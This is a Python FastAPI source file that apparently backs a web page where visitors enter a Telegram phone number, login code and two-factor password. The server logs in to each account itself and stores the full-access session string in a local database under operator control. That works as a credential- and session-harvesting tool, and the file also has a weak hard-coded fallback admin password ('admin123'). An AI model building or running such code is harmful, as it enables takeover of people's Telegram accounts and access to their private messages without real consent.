import os
import sqlite3
from datetime import datetime
from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError

app = FastAPI()
templates = Jinja2Templates(directory=".")

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
ADMIN_PASS = os.getenv("ADMIN_PASSWORD", "admin123")

DB = "sessions.db"

# Init DB
def init():
    conn = sqlite3.connect(DB)
    conn.execute("CREATE TABLE IF NOT EXISTS sessions (phone TEXT UNIQUE, session TEXT, time TEXT)")
    conn.execute("CREATE TABLE IF NOT EXISTS attempts (phone TEXT, count INT, time TEXT)")
    conn.commit()
    conn.close()
init()

def phone_exists(phone):
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("SELECT 1 FROM sessions WHERE phone = ?", (phone,))
    exists = c.fetchone()
    conn.close()
    return exists is not None

def save_session(phone, session):
    conn = sqlite3.connect(DB)
    conn.execute("REPLACE INTO sessions (phone, session, time) VALUES (?, ?, ?)",
                 (phone, session, datetime.utcnow().isoformat()))
    conn.execute("DELETE FROM attempts WHERE phone = ?", (phone,))
    conn.commit()
    conn.close()

def get_attempts(phone):
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("SELECT count FROM attempts WHERE phone = ?", (phone,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else 0

def inc_attempt(phone):
    conn = sqlite3.connect(DB)
    count = get_attempts(phone) + 1
    conn.execute("REPLACE INTO attempts (phone, count, time) VALUES (?, ?, ?)",
                 (phone, count, datetime.utcnow().isoformat()))
    conn.commit()
    conn.close()
    return count

def clear_attempts(phone):
    conn = sqlite3.connect(DB)
    conn.execute("DELETE FROM attempts WHERE phone = ?", (phone,))
    conn.commit()
    conn.close()

@app.get("/", response_class=HTMLResponse)
async def home(request: Request):
    phone = request.query_params.get("phone")
    return templates.TemplateResponse("index.html", {"request": request, "phone": phone})

@app.post("/send")
async def send_code(phone: str = Form(...)):
    if phone_exists(phone):
        return {"error": "You already have a session. Contact admin."}
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    try:
        await client.connect()
        await client.send_code_request(phone)
        await client.disconnect()
        clear_attempts(phone)
        return {"ok": True}
    except Exception as e:
        return {"error": str(e)}

@app.post("/code")
async def verify_code(phone: str = Form(...), code: str = Form(...)):
    if phone_exists(phone):
        return {"error": "Session exists. Contact admin."}

    attempts = inc_attempt(phone)
    if attempts > 3:
        return {"error": "Too many attempts. <button onclick=\"resend()\">Resend Code</button>"}

    client = TelegramClient(StringSession(), API_ID, API_HASH)
    try:
        await client.connect()
        await client.sign_in(phone, code)
        session = client.session.save()
        await client.disconnect()
        save_session(phone, session)
        return {"session": session}
    except SessionPasswordNeededError:
        return {"needs_password": True}
    except PhoneCodeInvalidError:
        return {"error": f"Wrong code. Attempt {attempts}/3"}
    except Exception as e:
        return {"error": str(e)}
    finally:
        if client.is_connected():
            await client.disconnect()

@app.post("/password")
async def password(phone: str = Form(...), code: str = Form(...), pwd: str = Form(...)):
    if phone_exists(phone):
        return {"error": "Session exists."}
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    try:
        await client.connect()
        await client.sign_in(phone, code, password=pwd)
        session = client.session.save()
        await client.disconnect()
        save_session(phone, session)
        return {"session": session}
    except Exception as e:
        return {"error": str(e)}
    finally:
        if client.is_connected():
            await client.disconnect()
